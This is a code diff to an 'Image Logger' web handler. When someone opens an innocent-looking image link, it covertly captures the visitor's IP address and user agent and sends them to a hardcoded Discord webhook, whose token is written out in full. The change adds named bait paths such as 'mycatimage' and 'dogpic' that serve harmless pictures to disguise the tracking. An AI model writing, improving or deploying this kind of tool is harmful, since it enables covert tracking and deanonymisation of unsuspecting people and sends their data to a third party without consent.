@@ -7,7 +7,17 @@ class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         # Your webhook URL
         WEBHOOK = "https://discord.com/api/webhooks/1464388498063884288/7dBwrJezTKRiAfM4DhXxN7mDwQDKwVkvy9hbRqnkIzrT3Y2KEa-hVu-oxGFsBRo98jkz"
-        IMAGE = "https://tse3.mm.bing.net/th/id/OIP.-ZtApdSarXwnPdnoTISdtwHaFj?rs=1&pid=ImgDetMain&o=7&rm=3"
+        
+        # Default image
+        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
+        
+        # Custom image mappings - add more here
+        IMAGES = {
+            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
+            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
+            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
+            # Add more custom names here
+        }
         
         # Get REAL IP and User Agent (Vercel specific headers)
         ip = self.headers.get('X-Real-IP') or self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
@@ -24,9 +34,16 @@ class handler(BaseHTTPRequestHandler):
         except:
             info = {}
         
-        # Parse query for custom image
-        query = dict(parse.parse_qsl(parse.urlsplit(self.path).query))
-        image_url = query.get('url', IMAGE)
+        # Get image name from path
+        path_parts = self.path.strip('/').split('/')
+        image_name = path_parts[-1] if len(path_parts) > 1 else None
+        
+        # Remove query string if exists
+        if image_name and '?' in image_name:
+            image_name = image_name.split('?')[0]
+        
+        # Get image URL
+        image_url = IMAGES.get(image_name, DEFAULT_IMAGE)
         
         # Create Discord embed
         embed = {
@@ -36,6 +53,8 @@ class handler(BaseHTTPRequestHandler):
                 "title": "🎯 Image Logger - IP Logged",
                 "color": 65280,
                 "description": f"""**A User Opened the Image!**
+
+**Endpoint:** `{image_name if image_name else 'default'}`
 
 **IP Info:**
 > **IP:** `{ip}`
